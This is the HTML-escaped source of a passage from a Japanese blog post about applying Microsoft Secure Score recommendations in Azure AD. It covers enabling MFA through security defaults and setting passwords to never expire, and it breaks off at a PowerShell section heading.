&lt;li&gt;&lt;a href=&quot;#%E5%BE%93%E6%9D%A5%E3%81%AE%E8%AA%8D%E8%A8%BC%E3%82%92%E7%A6%81%E6%AD%A2%E3%81%99%E3%82%8B%E3%83%9D%E3%83%AA%E3%82%B7%E3%83%BC%E3%82%92%E6%9C%89%E5%8A%B9%E3%81%AB%E3%81%99%E3%82%8B&quot;&gt;従来の認証を禁止するポリシーを有効にする&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%B5%E3%82%A4%E3%83%B3%E3%82%A4%E3%83%B3%E3%81%AE%E3%83%AA%E3%82%B9%E3%82%AF-%E3%83%9D%E3%83%AA%E3%82%B7%E3%83%BC%E3%82%92%E6%9C%89%E5%8A%B9%E3%81%AB%E3%81%99%E3%82%8B&quot;&gt;サインインのリスク ポリシーを有効にする&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%A6%E3%83%BC%E3%82%B6%E3%83%BC%E3%81%AE%E3%83%AA%E3%82%B9%E3%82%AF-%E3%83%9D%E3%83%AA%E3%82%B7%E3%83%BC%E3%82%92%E6%9C%89%E5%8A%B9%E3%81%AB%E3%81%99%E3%82%8B&quot;&gt;ユーザーのリスク ポリシーを有効にする&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E7%AE%A1%E7%90%86%E5%AF%BE%E8%B1%A1%E5%A4%96%E3%81%AE%E3%82%A2%E3%83%97%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AB%E5%AF%BE%E3%81%99%E3%82%8B%E3%83%A6%E3%83%BC%E3%82%B6%E3%83%BC%E3%81%AE%E6%89%BF%E8%AA%8D%E3%82%92%E8%A8%B1%E5%8F%AF%E3%81%97%E3%81%AA%E3%81%84&quot;&gt;管理対象外のアプリケーションに対するユーザーの承認を許可しない&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%85%A8%E4%BD%93%E7%AE%A1%E7%90%86%E8%80%85%E3%82%92%E8%A4%87%E6%95%B0%E6%8C%87%E5%AE%9A%E3%81%99%E3%82%8B&quot;&gt;全体管理者を複数指定する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%88%B6%E9%99%90%E4%BB%98%E3%81%8D%E7%AE%A1%E7%90%86%E3%83%AD%E3%83%BC%E3%83%AB%E3%82%92%E4%BD%BF%E7%94%A8%E3%81%99%E3%82%8B&quot;&gt;制限付き管理ロールを使用する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%BB%E3%83%AB%E3%83%95%E3%82%B5%E3%83%BC%E3%83%93%E3%82%B9%E3%81%AB%E3%82%88%E3%82%8B%E3%83%91%E3%82%B9%E3%83%AF%E3%83%BC%E3%83%89%E3%81%AE%E3%83%AA%E3%82%BB%E3%83%83%E3%83%88%E3%82%92%E6%9C%89%E5%8A%B9%E3%81%AB%E3%81%99%E3%82%8B&quot;&gt;セルフサービスによるパスワードのリセットを有効にする&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;管理ロールに対して-mfa-を要求する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E7%AE%A1%E7%90%86%E3%83%AD%E3%83%BC%E3%83%AB%E3%81%AB%E5%AF%BE%E3%81%97%E3%81%A6-mfa-%E3%82%92%E8%A6%81%E6%B1%82%E3%81%99%E3%82%8B&quot; aria-label=&quot;管理ロールに対して mfa を要求する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;管理ロールに対して MFA を要求する&lt;/h2&gt;
&lt;p&gt;まずは一番インパクトの大きいところから実践していきます。&lt;/p&gt;
&lt;p&gt;管理ロールにMFAを設定することが推奨されています。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;すべての管理ロールに対して多要素認証 (MFA)  を要求すると、攻撃者がアカウントにアクセスすることが困難になります。&lt;/p&gt;
&lt;p&gt;管理ロールには通常のユーザーよりも高度なアクセス許可が適用されています。これらのアカウントのいずれかがセキュリティ侵害を受けた場合、重要なデバイスとデータが攻撃を受けやすくなります。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;以下のドキュメントを見ると、MFAを導入することでアカウントが侵害されるリスクは 99.9% 以上低下するらしいです。&lt;/p&gt;
&lt;p&gt;MFAの設定方法として推奨されているのは、「条件付きアクセス ポリシー」によるサインイン保護のようですが、残念ながら僕のアカウントでは設定ができませんでした。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/azure/active-directory/authentication/tutorial-enable-azure-mfa&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Azure AD の Multi-Factor Authentication を有効にする | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/azure/active-directory/fundamentals/concept-fundamentals-mfa-get-started&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;組織での Azure AD Multi-Factor Authentication - Azure Active Directory | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;どうやらAzureのMFAは、利用しているライセンスごとに設定可能な方法に差異が発生しているようです。&lt;/p&gt;
&lt;p&gt;前述の「条件付きアクセス ポリシー」は&lt;code class=&quot;language-text&quot;&gt;Enterprise Mobility + Security E5&lt;/code&gt;または&lt;code class=&quot;language-text&quot;&gt;Azure AD Premium P2&lt;/code&gt;のライセンスを購入しているアカウントでのみ使用可能な設定のようですので、今回は&lt;code class=&quot;language-text&quot;&gt;Azure AD Free&lt;/code&gt;のユーザでも利用可能な&lt;a href=&quot;https://docs.microsoft.com/ja-jp/azure/active-directory/fundamentals/concept-fundamentals-security-defaults&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;セキュリティの既定値群&lt;/a&gt;による設定を行います。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/azure/active-directory/authentication/concept-mfa-licensing&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Azure AD Multi-Factor Authentication のバージョンと従量課金プラン | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;セキュリティの既定値群の設定&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E3%81%AE%E6%97%A2%E5%AE%9A%E5%80%A4%E7%BE%A4%E3%81%AE%E8%A8%AD%E5%AE%9A&quot; aria-label=&quot;セキュリティの既定値群の設定 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;セキュリティの既定値群の設定&lt;/h3&gt;
&lt;p&gt;「セキュリティの既定値群」によるMFAの有効化は以下の手順で設定できました。&lt;/p&gt;
&lt;p&gt;まず、Azureポータルから&lt;a href=&quot;https://portal.azure.com/#blade/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Azure Active Directory&lt;/a&gt;を開き、[プロパティ]を選択します。&lt;/p&gt;
&lt;p&gt;ここで、「セキュリティの既定値群の有効化」を行います。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/ae4f23f49f7d02216287d819a987fbe7/0b533/image-11.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 58.75%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAARlAAAEZQAGA43XUAAABv0lEQVQoz4WS0XLaMBBF/f9fwQfkgZd0eG2aGRLSpGmTTHmggxliYsAQW7ZlWxLc7lUwcTNTsoyQLa/O7t3dYL6I8fwSQykFrTVa2+/376t9l93FMSrxS9MUy+USURQh5llVeZ9gk6xhrZHl5FCjrmvsdrt3KPfDu1utoM/OoF5ThLPQA7Ms89AwDD004B+NeyLwsig8cOec3521IM5KRvrqinQ8b0v8mkRIX7fep6smME3jgWVZYiUZGGPeQAIkzBEmQarhEJay5JfkDaK0FrbzCroWJOvkCKQEBqBsAlszNzfYCxRH+R1Mt9bMkBJ5mcDFYuH3Qs5yaRJz1/f30FIfI8+NZOiDdWV2GugzVFl6rOFgMMCX83N8u7jAj4cHpNMp1PU1Csm6kAAMVOT5P037aEEmxW4OMvv9Pnq9Hubzuf/IJlgZEWZkWU9R0tb4v0BK9Jfl4mTyB0+Pj8gobfwblWRoWUMJSJCVxeAngZvNxjsVRQnXVL4m+VrGZzSCkYstjD7N4fkkUKncf+BQf/0+xngWI7m9Qy0NauS8kVIQwpJwGfsJcCvDzHlTKsNk+BPx5Qh6OjuOxEcj5BTwLwHfoCdHa7qVAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/ae4f23f49f7d02216287d819a987fbe7/8ac56/image-11.webp 240w,
/static/ae4f23f49f7d02216287d819a987fbe7/d3be9/image-11.webp 480w,
/static/ae4f23f49f7d02216287d819a987fbe7/b0a15/image-11.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/ae4f23f49f7d02216287d819a987fbe7/8ff5a/image-11.png 240w,
/static/ae4f23f49f7d02216287d819a987fbe7/e85cb/image-11.png 480w,
/static/ae4f23f49f7d02216287d819a987fbe7/0b533/image-11.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/ae4f23f49f7d02216287d819a987fbe7/0b533/image-11.png&quot;
            alt=&quot;image-11.png&quot;
            title=&quot;image-11.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;続いて、Azureポータルから&lt;a href=&quot;https://portal.azure.com/#blade/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Azure Active Directory&lt;/a&gt;を開き、[すべてのユーザー]を選択します。&lt;/p&gt;
&lt;p&gt;ここから[ユーザーごとのMFA]をクリックして以下の画面を開き、[quick steps]の[有効にする]をクリックしてMFAを有効化できました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/3c6d8873843f184362b124df7d419374/0b533/image-12.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 62.5%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAARlAAAEZQAGA43XUAAABwElEQVQ4y6VTa2/aMBTN//8pIMEHECXl24Q0TUL7sHZTxyjdeCi0kDgv27ET5/ReFyTabVTaLB05jo/vvec+grIsUdc1nHPg1bbtBQBN02AymaDb7aLX66Hf76PT6WA6nXo7we3NDe7uviNOEk8+Gf7XFUgpYaoKldYQQsBYC0ehsPGTg9M3w1IUmvkE5hpb+53/s4pgvdtjGcWI4gzrvQCfd08HiDSFMQaWH9HOBpraclIIDrbSkEpDGXJARmVlUTcOQVFKxCLHIUmR5iXyUhFRQVPE1TESKRUpqLB5Egg/fSXcYvUY45j015IVETkCrfmxIbm/54WlGmOxoeg/fP6Gj1/meEyylztKiTvCS94dEiitYCgHiqJaPiyx/PmA9WaDFeHXagWRZT5P+8MeaZqgLHM6mz8XReQF0iyFNhXJThBeX+NqfEUYYxyOMRgO8WOx8A6zIieegaI0MLbbLebzORZ0v7i/h6KcBv/TIrPZDMPBAGEYYjQaIYoiBG+b97xFzlvnLY+XpAor27yWfHkyLkNRq8S5giiUd+yLcm69PY7eS9Xad+DOuM4PgzfIs1wUBTKqJPceN/L7M/13PAOcQOwfwLBrzwAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/3c6d8873843f184362b124df7d419374/8ac56/image-12.webp 240w,
/static/3c6d8873843f184362b124df7d419374/d3be9/image-12.webp 480w,
/static/3c6d8873843f184362b124df7d419374/b0a15/image-12.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/3c6d8873843f184362b124df7d419374/8ff5a/image-12.png 240w,
/static/3c6d8873843f184362b124df7d419374/e85cb/image-12.png 480w,
/static/3c6d8873843f184362b124df7d419374/0b533/image-12.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/3c6d8873843f184362b124df7d419374/0b533/image-12.png&quot;
            alt=&quot;image-12.png&quot;
            title=&quot;image-12.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;これで管理アカウントにMFAの設定ができたっぽいです。&lt;/p&gt;
&lt;p&gt;残念ながら「改善アクション」で推奨されている方法は「条件付きポリシー」による設定であり、今回はライセンス的に実践できませんでした。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/305ebcfa7c0741cb3b619b0ec3e9eeb5/0b533/image-13.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 47.5%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAARlAAAEZQAGA43XUAAABcElEQVQoz42SiW6DMBBE/f+/F7XKQcIVsDmCOcIVCFOPWyqEVKkrrXzu+O2uhS5LTO83/mt1XeNwOOB8PsG93eD7PqRKEKcPyExD1HWFruvRtk/M04SmqaGkxND3mF4v65wrJfE0Z20/wLknOPkSTpggSTOUVY1UN1BFAxEGPuLojjxL0RnRUheoSo2+a+2aY2MepXP+bBpcrzc4XgAnkIgNlco1iscDTVVCBEGANE1RVRXGcURPMkO6Na7nebbzrutwuVzg3FxcXQ+uHyCMYhs/DAOEUgpFUdjUFlNLblKYtiyL9VVwnWut4XsepIwNQGfP3j99EFEUIc9zS8lakZAUq+CWkGsGlqaRpHRd9/fO+rjgoTaEpHwZSgpuCfeCdAJ8fnzYNPcmsiwDnZc48lvsBfkQRVdCbRrH78J74zhYiLZtbWbir/+20mxTojHweDx+N8Zx4JiR4p6pKUsgtoF7kb04jTRhGNoSkWjt/mpfcMMDZ4vgPj8AAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/305ebcfa7c0741cb3b619b0ec3e9eeb5/8ac56/image-13.webp 240w,
/static/305ebcfa7c0741cb3b619b0ec3e9eeb5/d3be9/image-13.webp 480w,
/static/305ebcfa7c0741cb3b619b0ec3e9eeb5/b0a15/image-13.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/305ebcfa7c0741cb3b619b0ec3e9eeb5/8ff5a/image-13.png 240w,
/static/305ebcfa7c0741cb3b619b0ec3e9eeb5/e85cb/image-13.png 480w,
/static/305ebcfa7c0741cb3b619b0ec3e9eeb5/0b533/image-13.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/305ebcfa7c0741cb3b619b0ec3e9eeb5/0b533/image-13.png&quot;
            alt=&quot;image-13.png&quot;
            title=&quot;image-13.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;とはいえ管理アカウントにはMFAをちゃんと設定できているため、「改善アクション」から「代替の軽減策を利用して解決済み」を選択しておきました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 400px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/492837bb5e76bebab177a8297c24bc43/e17e5/image-14.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 97.50000000000001%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsTAAALEwEAmpwYAAABxElEQVQ4y6VUXW/iMBD0//9F93L0oVSq+lKkUzlECRgSO4kJCfkggThh6vVdTkXXQtKuNNpItiez3vWw2WyGu7sRHsZjLBYLzOdzuK6LzWaDPM9BcT6f8VnQWrdeliUYkYxGPzE2hL7vW7LVaoXpdIqiKAYRHg4HMNyIa2Qf7WNBECAMQ2yVsorqurYLbdv+29RXIWUmpUQURUZuidPphKZpLjYOBdOaFPUrq08w6QfgrkBeVjjp9g+agTBn6uYM3RqFj68KPx5f8DSXWMbaoB4Mnmi8yBwTUYDNuMT90zMmv1/B/chgi7XJgxBEcLwQPIjBlC8w/TWByx0csgTpTmH/RRRpAlYdj1BmZDzPw3K5NJ2u0ZpuNWZs2p7o9mqtwWhUsixDkiTY7/d24f+x6ddhOstomB1nYdHN4LUB/gwUdJ4dTclZllqVZAZpmppB3/7NEXa73YVJ3CQkh6ADlOlx0zMUQiCOY0gprGEQeW9CUrher611OY5jGxMEPuhJEpkQns3d3V4LS0iKCNTp7pvKtOUaKBXa76qqQD+/BmowozKp3X06eAvWHDjn1qWVUUZ32dnXR3fUyxzID0nudyzrPd4AHbIPQ/sRSKQAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/492837bb5e76bebab177a8297c24bc43/8ac56/image-14.webp 240w,
/static/492837bb5e76bebab177a8297c24bc43/7f61c/image-14.webp 400w&quot;
              sizes=&quot;(max-width: 400px) 100vw, 400px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/492837bb5e76bebab177a8297c24bc43/8ff5a/image-14.png 240w,
/static/492837bb5e76bebab177a8297c24bc43/e17e5/image-14.png 400w&quot;
            sizes=&quot;(max-width: 400px) 100vw, 400px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/492837bb5e76bebab177a8297c24bc43/e17e5/image-14.png&quot;
            alt=&quot;image-14.png&quot;
            title=&quot;image-14.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;セキュリティで保護されたアクセスのためにすべてのユーザーが多要素認証を完了できることを確認する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E3%81%A7%E4%BF%9D%E8%AD%B7%E3%81%95%E3%82%8C%E3%81%9F%E3%82%A2%E3%82%AF%E3%82%BB%E3%82%B9%E3%81%AE%E3%81%9F%E3%82%81%E3%81%AB%E3%81%99%E3%81%B9%E3%81%A6%E3%81%AE%E3%83%A6%E3%83%BC%E3%82%B6%E3%83%BC%E3%81%8C%E5%A4%9A%E8%A6%81%E7%B4%A0%E8%AA%8D%E8%A8%BC%E3%82%92%E5%AE%8C%E4%BA%86%E3%81%A7%E3%81%8D%E3%82%8B%E3%81%93%E3%81%A8%E3%82%92%E7%A2%BA%E8%AA%8D%E3%81%99%E3%82%8B&quot; aria-label=&quot;セキュリティで保護されたアクセスのためにすべてのユーザーが多要素認証を完了できることを確認する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;セキュリティで保護されたアクセスのためにすべてのユーザーが多要素認証を完了できることを確認する&lt;/h2&gt;
&lt;p&gt;続いてもMFAです。&lt;/p&gt;
&lt;p&gt;今度は管理者ロールだけではなくすべてのユーザにMFAを設定せよ、という推奨事項ですね。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;多要素認証 (MFA) は、これらのユーザーがアクセスできるデバイスとデータを保護するのに役立ちます。&lt;/p&gt;
&lt;p&gt;Microsoft  Authenticator アプリや電話番号などの認証方法を追加すると、1  つの認証方法がセキュリティ侵害を受けた場合の保護を強化させることができます。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;残念ながらこちらについてもライセンス的に「条件付きポリシー」の設定ができませんので、前述の手順と同様にすべてのユーザにMFAを設定し、「改善アクション」から「代替の軽減策を利用して解決済み」を選択しておきました。&lt;/p&gt;
&lt;h2 id=&quot;パスワードを無期限にする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%91%E3%82%B9%E3%83%AF%E3%83%BC%E3%83%89%E3%82%92%E7%84%A1%E6%9C%9F%E9%99%90%E3%81%AB%E3%81%99%E3%82%8B&quot; aria-label=&quot;パスワードを無期限にする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;パスワードを無期限にする&lt;/h2&gt;
&lt;p&gt;次は「パスワードを無期限にする」設定です。&lt;/p&gt;
&lt;p&gt;日本企業などでは一般的に数か月に1回パスワード変更が強制されるところが多いように感じていますが、最近の研究ではこれはバッドプラクティスだそうです。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;定期的なパスワードのリセットが適用されると、パスワードのセキュリティが低下することが研究で判明しています。&lt;/p&gt;
&lt;p&gt;ユーザーは弱めのパスワードを選んで、リセットのたびに少しだけパスワードを変える傾向があります。&lt;/p&gt;
&lt;p&gt;ユーザーが強力なパスワード (長くて複雑で、実用的な言葉が存在しない)  を作成すれば、将来も今と同じくらいパスワードが強力なはずです。&lt;/p&gt;
&lt;p&gt;特別な理由がない限り定期的なパスワード更新を行うことが Microsoft  のセキュリティに対する正式な姿勢で、クラウドのみのテナントにはパスワード ポリシーが期限切れにならないように設定することをお勧めします。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;一部UI上の和訳がおかしいですが、「1つの強力なパスワードを設定し、特別な理由がない限りパスワードを変更しない」ことがMicrosoftの推奨事項になっているようです。&lt;/p&gt;
&lt;p&gt;ちなみに、UI上で「定期的なパスワード更新を行うことが Microsoft  のセキュリティに対する正式な姿勢で~」とな手ちる箇所は、英語版のUIでは以下の表記でした。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;It is Microsoft’s official security position to not expire passwords periodically without a specific reason, and recommends that cloud-only tenants set the password policy to never expire.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;「パスワードは定期的に変更しない」ことが推奨という理解であっているようです。&lt;/p&gt;
&lt;p&gt;というわけで、パスワードの期限設定を変更していきましょう。&lt;/p&gt;
&lt;h3 id=&quot;windows-powershell-用-microsoft-azure-ad-モジュールでパスワードの有効期限を設定する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#windows-powershell-%E7%94%A8-microsoft-azure-ad-%E3%83%A2%E3%82%B8%E3%83%A5%E3%83%BC%E3%83%AB%E3%81%A7%E3%83%91%E3%82%B9%E3%83%AF%E3%83%BC%E3%83%89%E3%81%AE%E6%9C%89%E5%8A%B9%E6%9C%9F%E9%99%90%E3%82%92%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B&quot; aria-label=&quot;windows powershell 用 microsoft azure ad モジュールでパスワードの有効期限を設定する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 